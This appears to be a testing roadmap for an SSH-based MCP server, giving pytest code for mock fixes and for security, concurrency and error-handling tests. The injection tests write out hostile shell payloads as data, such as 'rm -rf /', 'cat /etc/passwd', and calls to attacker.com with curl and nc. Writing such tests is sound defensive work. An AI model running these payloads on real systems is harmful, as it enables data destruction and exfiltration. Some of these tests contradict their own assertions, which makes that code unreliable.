# Scout MCP Testing Implementation Roadmap

**Status:** Ready for immediate implementation
**Priority:** Critical security and stability fixes first
**Estimated Total Effort:** 15-23 hours

---

## Phase 1: Fix Existing Issues (2-4 hours) - DO THIS FIRST

### 1.1 Fix test_cat_file_returns_contents Failure

**Current Status:** FAILING - AssertionError: `('file contents here', False) == 'file contents here'`

**Root Cause:** Mock doesn't properly simulate `asyncssh.SSHClientConnection.run()` which returns an SSHProcessResult object with tuple-like behavior.

**File to Update:** `/code/scout_mcp/tests/test_executors.py` (line 57-66)

**Action:** Update mock to return AsyncMock result object matching asyncssh interface:

```python
@pytest.mark.asyncio
async def test_cat_file_returns_contents(mock_connection: AsyncMock) -> None:
    """cat_file returns file contents."""
    # Create properly structured mock result
    mock_result = AsyncMock()
    mock_result.stdout = "file contents here"
    mock_result.stderr = None
    mock_result.returncode = 0

    mock_connection.run.return_value = mock_result

    result = await cat_file(mock_connection, "/etc/hosts", max_size=1024)

    assert result == "file contents here"
```

**Verification:** `pytest tests/test_executors.py::test_cat_file_returns_contents -v`

---

### 1.2 Fix Resource Warning in Pool Tests

**Current Status:** RuntimeWarning - coroutine 'AsyncMockMixin._execute_mock_call' was never awaited

**Root Cause:** `asyncssh.SSHClientConnection.close()` is async but mocked as sync

**File to Update:** `/code/scout_mcp/tests/test_pool.py` (line 84-97)

**Action:** Make close() an AsyncMock:

```python
@pytest.mark.asyncio
async def test_close_all_connections(mock_ssh_host: SSHHost) -> None:
    """close_all closes all pooled connections."""
    pool = ConnectionPool(idle_timeout=60)

    mock_conn = AsyncMock()
    mock_conn.is_closed = False
    mock_conn.close = AsyncMock()  # Make close async

    with patch("asyncssh.connect", new_callable=AsyncMock) as mock_connect:
        mock_connect.return_value = mock_conn

        await pool.get_connection(mock_ssh_host)
        await pool.close_all()

        mock_conn.close.assert_called_once()
```

**Verification:** `pytest tests/test_pool.py::test_close_all_connections -v`

---

### 1.3 Fix Global State Cleanup in Integration Tests

**Current Issue:** cleanup_task not cancelled, can cause stale async warnings

**File to Update:** `/code/scout_mcp/tests/test_integration.py` (line 13-17)

**Action:** Properly cancel cleanup_task:

```python
@pytest.fixture(autouse=True)
def reset_globals() -> None:
    """Reset global state before and after each test."""
    import asyncio

    # Cleanup before test
    if server_module._pool and server_module._pool._cleanup_task:
        task = server_module._pool._cleanup_task
        if task and not task.done():
            task.cancel()
            try:
                # Give task time to handle cancellation
                asyncio.run(asyncio.sleep(0.01))
            except RuntimeError:
                # Already running in async context
                pass

    server_module._config = None
    server_module._pool = None

    yield

    # Same cleanup after test
    if server_module._pool and server_module._pool._cleanup_task:
        task = server_module._pool._cleanup_task
        if task and not task.done():
            task.cancel()
```

**Verification:** `pytest tests/test_integration.py -v` (no warnings)

---

### 1.4 Create conftest.py with Shared Fixtures

**New File:** `/code/scout_mcp/tests/conftest.py`

```python
"""Shared pytest fixtures for scout_mcp tests."""

import asyncio
from pathlib import Path
from unittest.mock import AsyncMock

import pytest
from mcp_cat.config import SSHHost


@pytest.fixture
def mock_ssh_host() -> SSHHost:
    """Create a mock SSH host configuration."""
    return SSHHost(
        name="testhost",
        hostname="192.168.1.100",
        user="testuser",
        port=22,
    )


@pytest.fixture
def mock_ssh_config(tmp_path: Path) -> Path:
    """Create a temporary SSH config file."""
    config_file = tmp_path / "ssh_config"
    config_file.write_text("""
Host testhost
    HostName 192.168.1.100
    User testuser
    Port 22

Host production
    HostName 10.0.0.1
    User deploy
    Port 2222
    IdentityFile ~/.ssh/id_rsa

Host blocked
    HostName 10.0.0.2
    User admin
""")
    return config_file


@pytest.fixture
def mock_ssh_connection() -> AsyncMock:
    """Create a properly mocked SSH connection."""
    conn = AsyncMock()
    conn.is_closed = False

    # Make run() return AsyncMock with stdout/stderr/returncode
    async def mock_run(cmd: str, check: bool = True) -> AsyncMock:
        result = AsyncMock()
        result.stdout = None
        result.stderr = None
        result.returncode = 0
        return result

    conn.run.side_effect = mock_run
    conn.close = AsyncMock()

    return conn


@pytest.fixture(autouse=True)
def cleanup_globals() -> None:
    """Clean up global server state before and after each test."""
    import mcp_cat.server as server_module

    # Cleanup before test
    if hasattr(server_module, "_pool") and server_module._pool:
        if hasattr(server_module._pool, "_cleanup_task") and server_module._pool._cleanup_task:
            task = server_module._pool._cleanup_task
            if not task.done():
                task.cancel()

    server_module._config = None
    server_module._pool = None

    yield

    # Cleanup after test
    if hasattr(server_module, "_pool") and server_module._pool:
        if hasattr(server_module._pool, "_cleanup_task") and server_module._pool._cleanup_task:
            task = server_module._pool._cleanup_task
            if not task.done():
                task.cancel()

    server_module._config = None
    server_module._pool = None
```

**Verification:** `pytest tests/ -v` (all tests still pass, fewer fixtures duplicated)

---

## Phase 2: Add Security Tests (4-6 hours)

### 2.1 Command Injection Prevention Tests

**New File:** `/code/scout_mcp/tests/test_security_injection.py`

```python
"""Tests for command injection prevention in executors."""

import pytest
from unittest.mock import AsyncMock
from mcp_cat.executors import stat_path, cat_file, ls_dir, run_command


@pytest.mark.asyncio
async def test_stat_path_prevents_command_injection(mock_ssh_connection: AsyncMock) -> None:
    """stat_path uses proper quoting to prevent shell injection."""
    # Payload that would execute dangerous command if not quoted
    payload = "test'; rm -rf /; echo '"

    mock_ssh_connection.run.return_value = AsyncMock(
        stdout="regular file",
        stderr=None,
        returncode=0
    )

    result = await stat_path(mock_ssh_connection, payload)

    # Verify proper quoting was used
    called_command = mock_ssh_connection.run.call_args[0][0]

    # Command should contain properly quoted path (using repr)
    assert repr(payload) in called_command or f"'{payload}'" in called_command
    # Injection should not execute
    assert "; rm -rf" not in called_command


@pytest.mark.asyncio
async def test_cat_file_prevents_path_injection(mock_ssh_connection: AsyncMock) -> None:
    """cat_file quotes path to prevent injection."""
    payload = "file'; curl attacker.com; echo '"

    mock_ssh_connection.run.return_value = AsyncMock(
        stdout="",
        stderr=None,
        returncode=0
    )

    await cat_file(mock_ssh_connection, payload, max_size=1024)

    called_command = mock_ssh_connection.run.call_args[0][0]
    # Path should be quoted (via repr or similar)
    assert repr(payload) in called_command or f"'{payload}'" in called_command
    # Injection prevented
    assert "curl" not in called_command


@pytest.mark.asyncio
async def test_ls_dir_prevents_path_injection(mock_ssh_connection: AsyncMock) -> None:
    """ls_dir quotes path to prevent injection."""
    payload = "dir'; cat /etc/passwd; echo '"

    mock_ssh_connection.run.return_value = AsyncMock(
        stdout="",
        stderr=None,
        returncode=0
    )

    await ls_dir(mock_ssh_connection, payload)

    called_command = mock_ssh_connection.run.call_args[0][0]
    # Path should be quoted
    assert repr(payload) in called_command or f"'{payload}'" in called_command
    # Injection prevented
    assert "cat /etc/passwd" not in called_command


@pytest.mark.asyncio
async def test_run_command_prevents_working_dir_injection(mock_ssh_connection: AsyncMock) -> None:
    """run_command quotes working directory to prevent injection."""
    malicious_dir = "/tmp'; curl attacker.com; echo '"

    mock_ssh_connection.run.return_value = AsyncMock(
        stdout="",
        stderr=None,
        returncode=0
    )

    await run_command(mock_ssh_connection, malicious_dir, "ls", timeout=30)

    called_command = mock_ssh_connection.run.call_args[0][0]
    # Directory should be quoted
    assert repr(malicious_dir) in called_command or f"'{malicious_dir}'" in called_command
    # Injection prevented
    assert "curl" not in called_command


@pytest.mark.asyncio
async def test_run_command_timeout_wrapper_safe(mock_ssh_connection: AsyncMock) -> None:
    """run_command timeout wrapper doesn't introduce injection."""
    # Command that looks like it could bypass timeout
    command = "sleep 1000 && rm -rf /"

    mock_ssh_connection.run.return_value = AsyncMock(
        stdout="",
        stderr=None,
        returncode=0
    )

    await run_command(mock_ssh_connection, "/tmp", command, timeout=30)

    called_command = mock_ssh_connection.run.call_args[0][0]
    # Should have timeout wrapper
    assert "timeout 30" in called_command
    # Full command should be properly quoted
    assert repr(command) in called_command or f"'{command}'" in called_command


@pytest.mark.asyncio
async def test_injection_with_special_characters(mock_ssh_connection: AsyncMock) -> None:
    """Test various special characters don't cause injection."""
    payloads = [
        "$(whoami)",           # Command substitution
        "`cat /etc/passwd`",   # Backtick substitution
        "$(curl attacker.com)", # With curl
        "; nc attacker.com 1234", # Netcat backdoor
        "| curl attacker.com", # Pipe to curl
        "&& rm -rf /",          # Command chaining
        "|| touch /tmp/pwned",  # Alternative execution
    ]

    for payload in payloads:
        mock_ssh_connection.run.return_value = AsyncMock(
            stdout="regular file",
            stderr=None,
            returncode=0
        )

        await stat_path(mock_ssh_connection, payload)

        called_command = mock_ssh_connection.run.call_args[0][0]
        # Verify injection is escaped
        assert repr(payload) in called_command or f"'{payload}'" in called_command
```

**Verification:** `pytest tests/test_security_injection.py -v`

---

### 2.2 SSH Host Key Verification Tests

**New File:** `/code/scout_mcp/tests/test_security_ssh.py`

```python
"""Tests for SSH security features."""

import pytest
from unittest.mock import patch, AsyncMock
from mcp_cat.config import SSHHost
from mcp_cat.pool import ConnectionPool


@pytest.mark.asyncio
async def test_known_hosts_vulnerability_documented(mock_ssh_host: SSHHost) -> None:
    """Document current vulnerability: known_hosts is disabled."""
    pool = ConnectionPool(idle_timeout=60)

    with patch("asyncssh.connect", new_callable=AsyncMock) as mock_connect:
        mock_conn = AsyncMock()
        mock_conn.is_closed = False
        mock_connect.return_value = mock_conn

        await pool.get_connection(mock_ssh_host)

        call_kwargs = mock_connect.call_args[1]
        # This test DOCUMENTS the vulnerability
        # In production, known_hosts should NOT be None
        assert call_kwargs["known_hosts"] is None, (
            "VULNERABILITY DOCUMENTED: Host key verification is disabled. "
            "Should use known_hosts=True or path to ~/.ssh/known_hosts"
        )


@pytest.mark.asyncio
async def test_ssh_key_authentication_when_configured(mock_ssh_host: SSHHost) -> None:
    """Connection uses SSH key when identity_file is configured."""
    mock_ssh_host.identity_file = "~/.ssh/id_ed25519"
    pool = ConnectionPool(idle_timeout=60)

    with patch("asyncssh.connect", new_callable=AsyncMock) as mock_connect:
        mock_conn = AsyncMock()
        mock_conn.is_closed = False
        mock_connect.return_value = mock_conn

        await pool.get_connection(mock_ssh_host)

        call_kwargs = mock_connect.call_args[1]
        assert "client_keys" in call_kwargs
        assert call_kwargs["client_keys"] == ["~/.ssh/id_ed25519"]


@pytest.mark.asyncio
async def test_default_port_22_used(mock_ssh_host: SSHHost) -> None:
    """Default SSH port 22 is used when not specified."""
    pool = ConnectionPool(idle_timeout=60)

    with patch("asyncssh.connect", new_callable=AsyncMock) as mock_connect:
        mock_conn = AsyncMock()
        mock_conn.is_closed = False
        mock_connect.return_value = mock_conn

        await pool.get_connection(mock_ssh_host)

        call_args = mock_connect.call_args
        assert call_args[1]["port"] == 22


@pytest.mark.asyncio
async def test_custom_port_respected(mock_ssh_host: SSHHost) -> None:
    """Custom SSH port is used when specified."""
    mock_ssh_host.port = 2222
    pool = ConnectionPool(idle_timeout=60)

    with patch("asyncssh.connect", new_callable=AsyncMock) as mock_connect:
        mock_conn = AsyncMock()
        mock_conn.is_closed = False
        mock_connect.return_value = mock_conn

        await pool.get_connection(mock_ssh_host)

        call_args = mock_connect.call_args
        assert call_args[1]["port"] == 2222


@pytest.mark.asyncio
async def test_username_configured(mock_ssh_host: SSHHost) -> None:
    """SSH username is properly configured."""
    mock_ssh_host.user = "deploy"
    pool = ConnectionPool(idle_timeout=60)

    with patch("asyncssh.connect", new_callable=AsyncMock) as mock_connect:
        mock_conn = AsyncMock()
        mock_conn.is_closed = False
        mock_connect.return_value = mock_conn

        await pool.get_connection(mock_ssh_host)

        call_args = mock_connect.call_args
        assert call_args[1]["username"] == "deploy"
```

**Verification:** `pytest tests/test_security_ssh.py -v`

---

### 2.3 Timeout and Boundary Tests

**New File:** `/code/scout_mcp/tests/test_boundaries.py`

```python
"""Tests for timeout enforcement and boundary conditions."""

import pytest
import asyncio
from unittest.mock import AsyncMock
from mcp_cat.executors import cat_file, run_command, stat_path


@pytest.mark.asyncio
async def test_cat_file_exact_max_size_boundary(mock_ssh_connection: AsyncMock) -> None:
    """cat_file uses exact max_size value."""
    max_sizes = [1024, 1_048_576, 10_485_760]

    for max_size in max_sizes:
        mock_ssh_connection.run.return_value = AsyncMock(
            stdout="x" * 100,
            stderr=None,
            returncode=0
        )

        await cat_file(mock_ssh_connection, "/file", max_size=max_size)

        called_command = mock_ssh_connection.run.call_args[0][0]
        # Verify head -c uses exact size
        assert f"head -c {max_size}" in called_command, \
            f"Expected 'head -c {max_size}' in command"


@pytest.mark.asyncio
async def test_cat_file_zero_max_size(mock_ssh_connection: AsyncMock) -> None:
    """cat_file handles zero max_size."""
    mock_ssh_connection.run.return_value = AsyncMock(
        stdout="",
        stderr=None,
        returncode=0
    )

    result = await cat_file(mock_ssh_connection, "/file", max_size=0)

    # head -c 0 returns empty string
    assert result == ""


@pytest.mark.asyncio
async def test_run_command_timeout_included(mock_ssh_connection: AsyncMock) -> None:
    """run_command wraps command with timeout."""
    mock_ssh_connection.run.return_value = AsyncMock(
        stdout="done",
        stderr=None,
        returncode=0
    )

    await run_command(mock_ssh_connection, "/tmp", "sleep 10", timeout=5)

    called_command = mock_ssh_connection.run.call_args[0][0]
    # Should include timeout wrapper
    assert "timeout 5" in called_command
    # Should preserve original command
    assert "sleep 10" in called_command


@pytest.mark.asyncio
async def test_run_command_very_short_timeout(mock_ssh_connection: AsyncMock) -> None:
    """run_command handles very short timeouts."""
    mock_ssh_connection.run.return_value = AsyncMock(
        stdout="",
        stderr=None,
        returncode=124  # timeout exit code
    )

    result = await run_command(mock_ssh_connection, "/tmp", "sleep 100", timeout=1)

    # Command may timeout (exit code 124)
    assert result.returncode == 124


@pytest.mark.asyncio
async def test_stat_path_with_very_long_path(mock_ssh_connection: AsyncMock) -> None:
    """stat_path handles very long paths."""
    # Create path longer than typical Linux limits
    long_path = "/" + "subdir/" * 100 + "file.txt"

    mock_ssh_connection.run.return_value = AsyncMock(
        stdout="regular file",
        stderr=None,
        returncode=0
    )

    result = await stat_path(mock_ssh_connection, long_path)

    assert result == "file"


@pytest.mark.asyncio
async def test_cat_file_large_max_size(mock_ssh_connection: AsyncMock) -> None:
    """cat_file handles large max_size values."""
    max_size = 1_073_741_824  # 1GB

    mock_ssh_connection.run.return_value = AsyncMock(
        stdout="",
        stderr=None,
        returncode=0
    )

    result = await cat_file(mock_ssh_connection, "/huge/file", max_size=max_size)

    called_command = mock_ssh_connection.run.call_args[0][0]
    assert f"head -c {max_size}" in called_command


@pytest.mark.asyncio
async def test_run_command_zero_timeout_invalid(mock_ssh_connection: AsyncMock) -> None:
    """run_command handles zero/negative timeout gracefully."""
    mock_ssh_connection.run.return_value = AsyncMock(
        stdout="",
        stderr=None,
        returncode=0
    )

    # Zero timeout should still work (may return immediately)
    result = await run_command(mock_ssh_connection, "/tmp", "ls", timeout=0)

    assert result is not None


@pytest.mark.asyncio
async def test_special_characters_in_paths(mock_ssh_connection: AsyncMock) -> None:
    """Executors handle special characters in paths."""
    special_paths = [
        "/path with spaces/file.txt",
        "/path/with'quotes/file",
        "/path/with\"doublequotes/file",
        "/path/with$variables/file",
        "/path/with`backticks`/file",
        "/path/with\\backslash/file",
    ]

    for path in special_paths:
        mock_ssh_connection.run.return_value = AsyncMock(
            stdout="regular file",
            stderr=None,
            returncode=0
        )

        # Should not raise exception
        result = await stat_path(mock_ssh_connection, path)
        assert result is not None
```

**Verification:** `pytest tests/test_boundaries.py -v`

---

## Phase 3: Concurrency Tests (4-6 hours)

### 3.1 Connection Pool Concurrency Tests

**New File:** `/code/scout_mcp/tests/test_pool_concurrency.py`

```python
"""Tests for connection pool concurrent access patterns."""

import asyncio
import pytest
from unittest.mock import AsyncMock, patch
from mcp_cat.config import SSHHost
from mcp_cat.pool import ConnectionPool


@pytest.mark.asyncio
async def test_concurrent_requests_same_host_reuse_connection(mock_ssh_host: SSHHost) -> None:
    """Multiple concurrent requests to same host reuse single connection."""
    pool = ConnectionPool(idle_timeout=60)

    mock_conn = AsyncMock()
    mock_conn.is_closed = False

    with patch("asyncssh.connect", new_callable=AsyncMock) as mock_connect:
        mock_connect.return_value = mock_conn

        # Launch 10 concurrent requests
        tasks = [
            pool.get_connection(mock_ssh_host)
            for _ in range(10)
        ]
        connections = await asyncio.gather(*tasks)

        # All should return same connection object
        assert all(c == mock_conn for c in connections), \
            "Concurrent requests should reuse same connection"

        # Only one connection created
        assert mock_connect.call_count == 1, \
            f"Expected 1 connection created, got {mock_connect.call_count}"


@pytest.mark.asyncio
async def test_concurrent_requests_different_hosts(mock_ssh_host: SSHHost) -> None:
    """Concurrent requests to different hosts use different connections."""
    pool = ConnectionPool(idle_timeout=60)

    # Create multiple hosts
    hosts = [
        SSHHost(name=f"host{i}", hostname=f"192.168.1.{i}", user="test")
        for i in range(5)
    ]

    conn_counter = 0

    async def mock_connect(*args, **kwargs):
        nonlocal conn_counter
        conn_counter += 1
        conn = AsyncMock()
        conn.is_closed = False
        return conn

    with patch("asyncssh.connect", side_effect=mock_connect):
        # Launch concurrent requests to different hosts
        tasks = [pool.get_connection(host) for host in hosts]
        connections = await asyncio.gather(*tasks)

        # Should create 5 different connections
        assert len(set(id(c) for c in connections)) == 5, \
            "Different hosts should use different connections"
        assert conn_counter == 5


@pytest.mark.asyncio
async def test_cleanup_does_not_race_with_get_connection(mock_ssh_host: SSHHost) -> None:
    """Cleanup task doesn't interfere with concurrent get_connection calls."""
    pool = ConnectionPool(idle_timeout=1)  # Very short timeout

    mock_conn = AsyncMock()
    mock_conn.is_closed = False
    mock_conn.close = AsyncMock()

    with patch("asyncssh.connect", new_callable=AsyncMock) as mock_connect:
        mock_connect.return_value = mock_conn

        # Get connection
        conn1 = await pool.get_connection(mock_ssh_host)
        assert conn1 is not None

        # Launch cleanup by waiting
        await asyncio.sleep(1.5)

        # Get connection again while cleanup might be running
        # This should not crash or return None
        try:
            conn2 = await pool.get_connection(mock_ssh_host)
            assert conn2 is not None
        except Exception as e:
            pytest.fail(f"get_connection raised during cleanup: {e}")


@pytest.mark.asyncio
async def test_stale_connection_replaced_concurrent(mock_ssh_host: SSHHost) -> None:
    """Stale connections are replaced even under concurrent access."""
    pool = ConnectionPool(idle_timeout=60)

    mock_conn_old = AsyncMock()
    mock_conn_old.is_closed = True  # Simulate closed connection

    mock_conn_new = AsyncMock()
    mock_conn_new.is_closed = False

    with patch("asyncssh.connect", new_callable=AsyncMock) as mock_connect:
        mock_connect.side_effect = [mock_conn_old, mock_conn_new]

        # First request gets old connection
        await pool.get_connection(mock_ssh_host)

        # Concurrent requests should all get new connection
        tasks = [
            pool.get_connection(mock_ssh_host)
            for _ in range(5)
        ]
        connections = await asyncio.gather(*tasks)

        # All should be new connection
        assert all(c == mock_conn_new for c in connections)
        assert mock_connect.call_count == 2


@pytest.mark.asyncio
async def test_close_all_under_concurrent_access(mock_ssh_host: SSHHost) -> None:
    """close_all works safely even with concurrent access."""
    pool = ConnectionPool(idle_timeout=60)

    mock_conn = AsyncMock()
    mock_conn.is_closed = False
    mock_conn.close = AsyncMock()

    with patch("asyncssh.connect", new_callable=AsyncMock) as mock_connect:
        mock_connect.return_value = mock_conn

        # Get connection
        await pool.get_connection(mock_ssh_host)

        # Launch concurrent access and close simultaneously
        async def keep_accessing():
            for _ in range(10):
                try:
                    await pool.get_connection(mock_ssh_host)
                    await asyncio.sleep(0.01)
                except RuntimeError:
                    # Pool might be closed, expected
                    pass

        close_task = asyncio.create_task(pool.close_all())
        access_task = asyncio.create_task(keep_accessing())

        # Should not crash
        await asyncio.gather(close_task, access_task)

        # Connection should be closed
        mock_conn.close.assert_called()
```

**Verification:** `pytest tests/test_pool_concurrency.py -v`

---

### 3.2 Scout Server Concurrency Tests

**New File:** `/code/scout_mcp/tests/test_server_concurrency.py`

```python
"""Tests for server concurrent operation."""

import asyncio
import pytest
from pathlib import Path
from unittest.mock import AsyncMock, patch
import mcp_cat.server as server_module
from mcp_cat.config import Config


@pytest.mark.asyncio
async def test_scout_concurrent_calls_same_host(mock_ssh_config: Path) -> None:
    """Multiple concurrent scout calls to same host share connection."""
    server_module._config = Config(ssh_config_path=mock_ssh_config)
    server_module._pool = None

    scout_fn = server_module.scout.fn

    mock_conn = AsyncMock()
    mock_conn.is_closed = False
    mock_conn.run.return_value = AsyncMock(
        stdout="regular file",
        stderr=None,
        returncode=0
    )

    with patch("asyncssh.connect", new_callable=AsyncMock) as mock_connect:
        mock_connect.return_value = mock_conn

        # Launch 5 concurrent scout calls to same host
        tasks = [
            scout_fn("testhost:/etc/hosts"),
            scout_fn("testhost:/etc/passwd"),
            scout_fn("testhost:/etc/shadow"),
            scout_fn("testhost:/etc/sudoers"),
            scout_fn("testhost:/etc/hosts"),
        ]

        results = await asyncio.gather(*tasks)

        # All should succeed
        assert len(results) == 5
        assert all(isinstance(r, str) for r in results)

        # Only one connection created
        assert mock_connect.call_count == 1, \
            "Concurrent calls should reuse connection"


@pytest.mark.asyncio
async def test_scout_concurrent_different_hosts(mock_ssh_config: Path) -> None:
    """Concurrent scout calls to different hosts create separate connections."""
    server_module._config = Config(ssh_config_path=mock_ssh_config)
    server_module._pool = None

    scout_fn = server_module.scout.fn

    mock_conn = AsyncMock()
    mock_conn.is_closed = False
    mock_conn.run.return_value = AsyncMock(
        stdout="regular file",
        stderr=None,
        returncode=0
    )

    with patch("asyncssh.connect", new_callable=AsyncMock) as mock_connect:
        mock_connect.return_value = mock_conn

        # Call to two different hosts
        tasks = [
            scout_fn("testhost:/etc/hosts"),
            scout_fn("production:/etc/hosts"),
        ]

        results = await asyncio.gather(*tasks)

        # Both should succeed
        assert len(results) == 2
        # Two connections created
        assert mock_connect.call_count == 2


@pytest.mark.asyncio
async def test_scout_concurrent_cat_and_ls(mock_ssh_config: Path) -> None:
    """Concurrent cat and ls operations work together."""
    server_module._config = Config(ssh_config_path=mock_ssh_config)
    server_module._pool = None

    scout_fn = server_module.scout.fn

    mock_conn = AsyncMock()
    mock_conn.is_closed = False

    file_count = 0

    async def mock_run(cmd: str, check: bool = True) -> AsyncMock:
        nonlocal file_count
        file_count += 1

        result = AsyncMock()
        if "stat" in cmd:
            result.stdout = "regular file" if file_count % 2 == 0 else "directory"
        elif "head" in cmd:
            result.stdout = "file contents"
        elif "ls" in cmd:
            result.stdout = "file1.txt\nfile2.txt"
        else:
            result.stdout = ""

        result.stderr = None
        result.returncode = 0
        return result

    mock_conn.run.side_effect = mock_run

    with patch("asyncssh.connect", return_value=mock_conn):
        # Mix of cat and ls operations
        tasks = [
            scout_fn("testhost:/etc/hosts"),
            scout_fn("testhost:/etc"),
            scout_fn("testhost:/var/log"),
            scout_fn("testhost:/etc/passwd"),
        ]

        results = await asyncio.gather(*tasks)

        # All should complete
        assert len(results) == 4
```

**Verification:** `pytest tests/test_server_concurrency.py -v`

---

## Phase 4: Error Handling Tests (3-4 hours)

### 4.1 Server Error Path Tests

**New File:** `/code/scout_mcp/tests/test_server_errors.py`

```python
"""Tests for server error handling paths."""

import asyncio
import pytest
from pathlib import Path
from unittest.mock import AsyncMock, patch
import mcp_cat.server as server_module
from mcp_cat.config import Config


@pytest.mark.asyncio
async def test_scout_connection_refused(mock_ssh_config: Path) -> None:
    """scout handles connection refused error."""
    server_module._config = Config(ssh_config_path=mock_ssh_config)
    server_module._pool = None

    scout_fn = server_module.scout.fn

    with patch("asyncssh.connect", new_callable=AsyncMock) as mock_connect:
        mock_connect.side_effect = OSError("Connection refused")

        result = await scout_fn("testhost:/etc/hosts")

        assert "Error" in result
        assert "Cannot connect" in result


@pytest.mark.asyncio
async def test_scout_connection_timeout(mock_ssh_config: Path) -> None:
    """scout handles connection timeout."""
    server_module._config = Config(ssh_config_path=mock_ssh_config)
    server_module._pool = None

    scout_fn = server_module.scout.fn

    with patch("asyncssh.connect", new_callable=AsyncMock) as mock_connect:
        async def slow_connect(*args, **kwargs):
            await asyncio.sleep(10)

        mock_connect.side_effect = slow_connect

        with pytest.raises(asyncio.TimeoutError):
            await asyncio.wait_for(
                scout_fn("testhost:/etc/hosts"),
                timeout=0.1
            )


@pytest.mark.asyncio
async def test_scout_stat_path_fails(mock_ssh_config: Path) -> None:
    """scout handles stat_path failures."""
    server_module._config = Config(ssh_config_path=mock_ssh_config)
    server_module._pool = None

    scout_fn = server_module.scout.fn

    mock_conn = AsyncMock()
    mock_conn.is_closed = False
    mock_conn.run.side_effect = Exception("Permission denied")

    with patch("asyncssh.connect", return_value=mock_conn):
        result = await scout_fn("testhost:/root/.ssh/id_rsa")

        assert "Error" in result
        assert "Cannot stat" in result


@pytest.mark.asyncio
async def test_scout_cat_file_permission_denied(mock_ssh_config: Path) -> None:
    """scout handles file read permission errors."""
    server_module._config = Config(ssh_config_path=mock_ssh_config)
    server_module._pool = None

    scout_fn = server_module.scout.fn

    mock_conn = AsyncMock()
    mock_conn.is_closed = False

    # stat succeeds, cat fails
    mock_conn.run.side_effect = [
        AsyncMock(stdout="regular file", stderr=None, returncode=0),
        AsyncMock(stdout="", stderr="Permission denied", returncode=13),
    ]

    with patch("asyncssh.connect", return_value=mock_conn):
        result = await scout_fn("testhost:/root/.ssh/id_rsa")

        assert "Error" in result


@pytest.mark.asyncio
async def test_scout_command_execution_error(mock_ssh_config: Path) -> None:
    """scout handles command execution errors."""
    server_module._config = Config(ssh_config_path=mock_ssh_config)
    server_module._pool = None

    scout_fn = server_module.scout.fn

    mock_conn = AsyncMock()
    mock_conn.is_closed = False
    mock_conn.run.side_effect = Exception("Command not found")

    with patch("asyncssh.connect", return_value=mock_conn):
        result = await scout_fn("testhost:/tmp", "nonexistent_command")

        assert "Error" in result
        assert "Command failed" in result


@pytest.mark.asyncio
async def test_scout_path_not_found(mock_ssh_config: Path) -> None:
    """scout handles non-existent paths."""
    server_module._config = Config(ssh_config_path=mock_ssh_config)
    server_module._pool = None

    scout_fn = server_module.scout.fn

    mock_conn = AsyncMock()
    mock_conn.is_closed = False
    mock_conn.run.return_value = AsyncMock(
        stdout="",
        stderr=None,
        returncode=2
    )

    with patch("asyncssh.connect", return_value=mock_conn):
        result = await scout_fn("testhost:/nonexistent/path")

        assert "Error" in result
        assert "Path not found" in result


@pytest.mark.asyncio
async def test_scout_no_hosts_configured() -> None:
    """scout('hosts') with no SSH config."""
    server_module._config = Config(ssh_config_path=Path("/nonexistent/.ssh/config"))
    server_module._pool = None

    scout_fn = server_module.scout.fn

    result = await scout_fn("hosts")

    assert "No SSH hosts" in result
```

**Verification:** `pytest tests/test_server_errors.py -v`

---

## Implementation Checklist

### Phase 1: Fix Issues
- [ ] Fix `test_cat_file_returns_contents` (5 min)
- [ ] Fix resource warning in pool tests (5 min)
- [ ] Update global state cleanup (10 min)
- [ ] Create conftest.py (20 min)
- [ ] Run all tests to verify (5 min)

### Phase 2: Security Tests
- [ ] Create test_security_injection.py (45 min)
- [ ] Create test_security_ssh.py (30 min)
- [ ] Create test_boundaries.py (45 min)
- [ ] Verify all tests pass (10 min)

### Phase 3: Concurrency Tests
- [ ] Create test_pool_concurrency.py (60 min)
- [ ] Create test_server_concurrency.py (45 min)
- [ ] Stress test with multiple concurrent operations (15 min)
- [ ] Verify no deadlocks (10 min)

### Phase 4: Error Handling
- [ ] Create test_server_errors.py (60 min)
- [ ] Test all error paths (30 min)
- [ ] Verify error messages are helpful (15 min)
- [ ] Check coverage > 90% (10 min)

### Coverage Goals

After all phases, target:
- Overall coverage: **90%+** (currently 81%)
- Executors.py: **95%+** (currently 70%)
- Server.py: **90%+** (currently 69%)
- Pool.py: **95%+** (currently 79%)
- Security test count: **12+** tests (currently 0)
- Concurrency test count: **10+** tests (currently 0)
- Error handling tests: **15+** tests (currently 7)
- Total test count: **75+** tests (currently 41)

---

**Implementation Ready:** All test code provided above can be copied directly into respective files.
